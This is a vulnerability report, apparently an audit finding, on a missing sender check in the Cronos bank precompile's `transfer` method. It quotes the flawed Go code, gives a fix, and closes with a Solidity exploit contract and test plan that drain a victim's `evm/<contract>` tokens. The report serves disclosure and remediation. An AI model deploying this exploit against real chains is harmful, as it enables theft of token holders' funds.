### Title
Unauthorized `from`-address in Bank Precompile `transfer` Allows Any EVM Contract to Drain Arbitrary Holders of Its `evm/<contract>` Tokens — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `TransferMethodName` branch of `BankContract.Run` accepts a caller-supplied `sender` argument and passes it directly as the `from` address to `bankKeeper.SendCoins`, with **no check that `sender == contract.Caller()`**. Any EVM contract can therefore drain `evm/<callerContract>` tokens from any address that holds them — including regular user accounts, IBC escrow accounts, and module accounts not in the blocked list — without the owner's consent.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` case:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)

from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())

if err := bc.checkBlockedAddr(to); err != nil { // only guards the RECIPIENT
    return nil, err
}

denom := EVMDenom(contract.Caller())            // evm/<callerContractAddress>
amt   := sdk.NewCoin(denom, ...)

bc.bankKeeper.SendCoins(ctx, from, to, ...)     // `from` is arbitrary
``` [1](#0-0) 

The only guard present is `checkBlockedAddr(to)`, which checks whether the **recipient** is a blocked address. [2](#0-1) 

There is no corresponding check that `from` equals `contract.Caller()`, and no check that `from` is a blocked/module address. `bankKeeper.SendCoins` itself does not enforce sender authorization — it only verifies sufficient balance and that the recipient is not blocked. [3](#0-2) 

Compare with `MintMethodName`/`BurnMethodName`, where the denom is `EVMDenom(contract.Caller())` and the caller implicitly authorizes the operation because it is acting on its own token supply. The `transfer` method was presumably intended to let a contract move its own tokens from itself to another address, but the missing `from == caller` invariant breaks this entirely. [4](#0-3) 

---

### Impact Explanation

**Unauthorized transfer of `evm/<A>` tokens from any non-blocked holder.**

Concrete victims:

1. **Regular user accounts** — A contract mints `evm/<A>` tokens to users (e.g., as a reward or via a DeFi protocol). It can later call `transfer(user, attacker, balance)` to steal them back without the user's signature or approval.

2. **IBC escrow accounts** — IBC transfer escrow accounts are derived from channel IDs, not from `maccPerms`, so they are **not** in `BlockedAddrs()`. [5](#0-4) 
   If `evm/<A>` tokens were escrowed during an IBC transfer, contract A can drain the escrow account.

3. **Module accounts not in the blocked list** — `allowedReceivingModAcc` entries are set to `false` in `BlockedAddrs`, meaning they can receive funds. If such an account accumulates `evm/<A>` tokens, contract A can drain it.

The denom is scoped to `evm/<callerContract>`, so the attacker cannot steal arbitrary denoms — but for any token type that a contract controls, it can steal from all holders, breaking the fundamental ERC-20-like ownership invariant.

---

### Likelihood Explanation

The attack requires no special privileges:
- Deploy any EVM contract (unprivileged).
- Mint `evm/<A>` tokens to a victim address using the `mint` precompile method (also unprivileged, callable by the same contract).
- Immediately call `transfer(victim, attacker, amount)` to drain them.

The entire attack is self-contained in a single contract and requires no admin keys, governance, or external assumptions.

---

### Recommendation

Enforce that the `from` address equals the calling contract:

```go
case TransferMethodName:
    // ...
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
```

Alternatively, remove the `sender` argument entirely and derive `from` from `contract.Caller()`, mirroring the design of `mint`/`burn`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract Exploit {
    IBank constant bank = IBank(address(0x64)); // bankContractAddress = bytes{100}
    address public victim;
    address public attacker;

    constructor(address _victim, address _attacker) {
        victim   = _victim;
        attacker = _attacker;
    }

    function seed() external {
        // Mint evm/<this> tokens to the victim (could be any address, including IBC escrow)
        bank.mint(victim, 1_000_000);
    }

    function exploit() external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // Drain victim's evm/<this> tokens with no victim authorization
        bank.transfer(victim, attacker, bal);
    }
}
```

**Test plan:**
1. Deploy `Exploit` with `victim = <any non-blocked address holding evm/<Exploit> tokens>`.
2. Call `seed()` — victim now holds `1_000_000 evm/<Exploit>`.
3. Call `exploit()` — `bankKeeper.SendCoins(victim → attacker)` executes; victim balance drops to 0, attacker balance increases by `1_000_000`.
4. Assert: victim drained, attacker enriched, no victim signature required.
